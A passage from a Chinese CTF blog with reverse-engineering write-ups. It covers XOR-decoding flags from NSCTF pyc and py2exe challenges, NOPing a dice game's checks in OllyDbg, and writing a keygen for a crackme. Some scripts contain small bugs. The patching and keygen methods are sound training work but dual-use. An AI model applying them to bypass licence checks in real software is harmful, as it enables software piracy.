);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = 0;</span><br><span class="line">    if ( strlen((const char *)&amp;v5) == 0 )</span><br><span class="line">      return 1;</span><br><span class="line">    while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( ++v3 &gt;= strlen((const char *)&amp;v5) )</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知flag的长度和v5相等，flag每位与0x20异或，v5每位减5之后，flag[i]=v5[i]。</p>
<p>逆运算脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,6]</span><br><span class="line">temp=[]</span><br><span class="line">for i in v5:</span><br><span class="line">	i-=5</span><br><span class="line">	i^=0x20</span><br><span class="line">	key.append(i)</span><br><span class="line">flag=&apos;&apos;.join([chr(i) for i in temp])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h1 id="NSCTF-Reverse-500"><a href="#NSCTF-Reverse-500" class="headerlink" title="NSCTF Reverse 500"></a>NSCTF Reverse 500</h1><p>pyc文件直接在线反编译一波：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;M,\x1d-\x18&#125;E&apos;\x1ezN~\x1b*\x19+\x12%\x1d-&quot; + &apos;I\x7fM(I&#123;I\x7fJ.\x16wWcRj\x0e6\x0fn&apos; + &apos;Zo\nn\x0fk\t1R7\x03g\x067\x00eUb\x043&apos; + &apos;\x014\x071Rr\x14x\x19~D?q&quot;a5s,A%&apos; + &quot;\x10&apos;\x11uLyA%\x1d|DrFv\x12t\x11#B&amp;&quot; + &apos;GsKzK*O)\x1c%GuC&gt;\x1e\x7f\x1b+\x19*&apos; + &apos;\x1e&amp;\x14-\x1f/\x1axAqBq@yO-LtE&#125;&apos; + &apos;\x1b,MuBp\x12&apos;</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import cStringIO</span><br><span class="line">import string</span><br><span class="line">import dis</span><br><span class="line">import marshal</span><br><span class="line">import types</span><br><span class="line">import random</span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line">def reverse(string):</span><br><span class="line">    return string[::-1]</span><br><span class="line"></span><br><span class="line">data_list = list(reverse(data)[1:])</span><br><span class="line"></span><br><span class="line">def decrpyt(c, key2):</span><br><span class="line">    global count</span><br><span class="line">    data_list[count] = c ^ key2</span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag1():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 8])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 3])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag2():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 11])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 4 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag3():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 5])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 2 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag4():</span><br><span class="line">    global count</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 1])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 1 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    count = 0</span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag5():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 9])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">            key = struct.unpack(&apos;B&apos;, data[len(data) - 3 - count])[0]</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    for c in data_list[::-12]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">GetFlag1()</span><br></pre></td></tr></table></figure>
<p>直接运行一波，发现会对data进行报错，百度后发现时在反编译时，例如<code>0f aa</code>这样的指令时会变成<code>\xfa\xa*</code>这样，就会导致错位⽽而解不出flag。</p>
<p>这时可以用winhex打开pyc文件，找到data，然后自己进行转换就行了，data用十六进制表示为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4D2C1D2D 187D4527 1E7A4E7E 1B2A192B 12251D2D 73140000 00497F4D 28497B49 7F4A2E16 77576352 6A0E360F 6E731400 00005A6F 0A6E0F6B 09315237 03670637 00655562 04337314 00000001 34073152 72147819 7E443F71 22613573 2C412573 14000000 10271175 4C794125 1D7C4472 46761274 11234226 73140000 0047734B 7A4B2A4F 291C2547 75433E1E 7F1B2B19 2A731400 00001E26 142D1F2F 1A784171 42714079 4F2D4C74 457D7307 0000001B 2C4D7542 7012</span><br></pre></td></tr></table></figure>
<p>然而运行后得不到flag，不过这里定义了5个getflag函数，一个个尝试后在getflag4时找到了flag。</p>
<h1 id="NSCTF-Reverse-400"><a href="#NSCTF-Reverse-400" class="headerlink" title="NSCTF Reverse 400"></a>NSCTF Reverse 400</h1><p>py2exe的逆向，参考<a href="https://www.cnblogs.com/pcat/p/8990482.html" target="_blank" rel="noopener">PyInstaller Extractor安装和使用方法</a></p>
<p>在reverse03里找到了一些代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">data=\&quot;\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b&quot;+\&quot;\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72&quot;+\&quot;\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b&quot;</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">char buf[] = &quot;flag:&#123;NSCTF_md5098f6bcd4621d373cade4e832627b4f6&#125;&quot;;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;%d\n&quot;, strlen(buf));</span><br><span class="line">	char key = &apos;\x0b&apos;;</span><br><span class="line">	buf[47] ^= key;</span><br><span class="line">	for (int i = 1; i &lt; 48; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[48 - i - 1] ^= buf[48 - i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">print &quot;Revese it?????????&quot;</span><br></pre></td></tr></table></figure>
<p>直接就给出了flag，然而并不正确，看来给了一段c的代码是要用到的。</p>
<p>后发现对data进行如c代码的运算后就可以得到flag，逆运算脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">data=&quot;\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b&quot;+&quot;\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72&quot;+&quot;\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b&quot;</span><br><span class="line">temp=list(data)</span><br><span class="line">for i in range(0,len(temp)-2):</span><br><span class="line">	temp[i]=chr(ord(temp[i])^ord(temp[i+1]))</span><br><span class="line">temp[47]=chr(ord(temp[47])^0x0b)</span><br><span class="line">flag=&apos;&apos;.join(i for i in temp)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h1 id="bin100-ebCTF-2013"><a href="#bin100-ebCTF-2013" class="headerlink" title="bin100(ebCTF 2013)"></a>bin100(ebCTF 2013)</h1><p>一个掷🎲小游戏，掷出需要的数字就能得到flag。</p>
<p>用od打开，字符串搜索，定位到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040192B     /75 5E         jnz short Dice.0040198B</span><br><span class="line">0040192D   . |C74424 04 1F4&gt;mov dword ptr ss:[esp+0x4],Dice.0044421F ;  [*] You rolled a three! Good!</span><br></pre></td></tr></table></figure>
<p>可见这里就是判断掷出的🎲是不是需要的数字，如果不是的话，jnz就会使得进程跳到失败，所以把jnz这一句nop掉就可以跳过判断，使程序认为掷出了需要的数字，后面还有四个一样的地方，也nop掉之后f9运行程序，回车掷完🎲之后，f8往下运行就可以得到flag。</p>
<h1 id="该题不简单"><a href="#该题不简单" class="headerlink" title="该题不简单"></a>该题不简单</h1><p>一开始没仔细看题目，以为成功登陆就可以得到flag…后来发现是要找到对应用户名hello的注册码，还是用ida打开看看吧。</p>
<p>文本搜索一下无效，找到了关键函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">String[0] = 0;</span><br><span class="line">memset(&amp;String[1], 0, 0x1Cu);</span><br><span class="line">v3 = 0;</span><br><span class="line">v4 = 0;</span><br><span class="line">String1 = 0;</span><br><span class="line">memset(&amp;v10, 0, 0x1Cu);</span><br><span class="line">v11 = 0;</span><br><span class="line">v12 = 0;</span><br><span class="line">String2 = 0;</span><br><span class="line">memset(&amp;v6, 0, 0x1Cu);</span><br><span class="line">v7 = 0;</span><br><span class="line">v8 = 0;</span><br><span class="line">if ( GetDlgItemTextA(hDlg, 1000, String, 16) &lt; 5 )</span><br><span class="line">  return 1;</span><br><span class="line">GetDlgItemTextA(hDlg, 1001, &amp;String1, 16);</span><br><span class="line">v1 = 0;</span><br><span class="line">if ( strlen(String) != 0 )</span><br><span class="line">&#123;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;String2 + v1) = (v1 + v1 * String[v1] * String[v1]) % 0x42 + 33;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v1 &lt; strlen(String) );</span><br><span class="line">&#125;</span><br><span class="line">strcpy(String, &quot;Happy@&quot;);</span><br><span class="line">lstrcatA(String, &amp;String2);</span><br><span class="line">return lstrcmpA(&amp;String1, String) != 0;</span><br></pre></td></tr></table></figure>
<p>如果这个函数返回1的话就是注册码正确了。<br>输入用户名后，<code>注册码[i]=i+i*用户名[i]*用户名[i]%0x42+33</code>，再在前面加上Happy@就得到注册码了。</p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;hello&quot;</span><br><span class="line">string2=&quot;&quot;</span><br><span class="line">for i in range(len(username)):</span><br><span class="line">	string2+=chr(i+i*ord(username[i])*ord(username[i])%0x42 +33)</span><br><span class="line">print &quot;Happy@&quot;+string2</span><br></pre></td></tr></table></figure>
<p>这样的明文密码用od调试应该会更快一点，可以直接看到注册码是什么。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2019 4eriri
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 1;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":true},"log":false});</script></body>
</html>